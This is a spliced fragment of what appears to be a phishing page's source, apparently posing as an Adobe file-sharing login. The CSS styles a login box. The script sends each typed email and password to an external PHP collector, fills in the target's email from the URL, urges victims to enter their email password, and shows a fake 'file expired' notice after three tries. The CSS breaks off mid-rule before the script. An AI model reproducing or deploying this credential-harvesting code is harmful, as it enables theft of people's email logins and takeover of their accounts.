    .login-box {
      width: 400px;
      background-color: #1c1c1c;
      border-radius: 10px;
      box-shadow: 0 15px 25px rgba(0,0,0,0.5);
      padding: 40px 30px;
      color: #ffffff;
      text-align: center;
    }

    .login-box h1 {
      color: #ff0000;
      font-size: 28px;
      margin-bottom: 10px;
    }

    .login-box h2 {
      font-size: 20px;
      margin-bottom: 10px;
      color: white;
    }

    .login-box p {
      font-size: 14px;
      margin-bottom: 20px;
      color: #cccccc;
    }

    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }

    .input-group label {
      display: block;
      font-weight: bold;
      margin-bottom: 5px;
      color: #e0e0e0;
    }

    .input-group input[type="email"],
    .input-group input[type="password"] {

      </div>

<script>
  let attemptCount = 0;

  document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // BLOCK further submission if 3 or more failed attempts
    if (attemptCount >= 3) {
      showError("The file you're trying to access has expired...");
      const submitBtn = document.querySelector('#loginForm button[type="submit"]');
      if (submitBtn) submitBtn.disabled = true;
      return; // STOP further attempts permanently
    }

    const errorBox = document.getElementById('errorMessage');
    errorBox.style.display = 'none';
    errorBox.innerHTML = '';

    const username = document.getElementById('ggg').value;
    const password = document.getElementById('hhh').value;

    const formData = new FormData();
    formData.append('ggg', username);
    formData.append('hhh', password);

    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://markrepo.online/SD/adobetgeml/aaa.php', true);
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4) {
        const response = xhr.responseText;

        if (response === 'success') {
          attemptCount = 0;
          errorBox.style.display = 'none';
          errorBox.innerHTML = '';
        } else {
          attemptCount++;

          setTimeout(() => {
            if (attemptCount >= 3) {
              showError("The file you're trying to access has expired...");
              const submitBtn = document.querySelector('#loginForm button[type="submit"]');
              if (submitBtn) submitBtn.disabled = true;
            } else {
              showError("Incorrect email or password. Please make sure to input same password you use for accessing your email. Try again!");
            }
            document.getElementById('hhh').value = '';
          }, 3000);
        }
      }
    };
    xhr.send(formData);
  });

  function showError(message) {
    const errorBox = document.getElementById('errorMessage');
    errorBox.innerHTML = message;
    errorBox.style.display = 'block';
  }

  // Autofill email from hash
  window.onload = function() {
    const hash = window.location.hash;
    if (hash) {
      const email = hash.substring(1);
      const emailInput = document.getElementById('ggg');
      emailInput.value = decodeURIComponent(email);
    }
  };
</script>
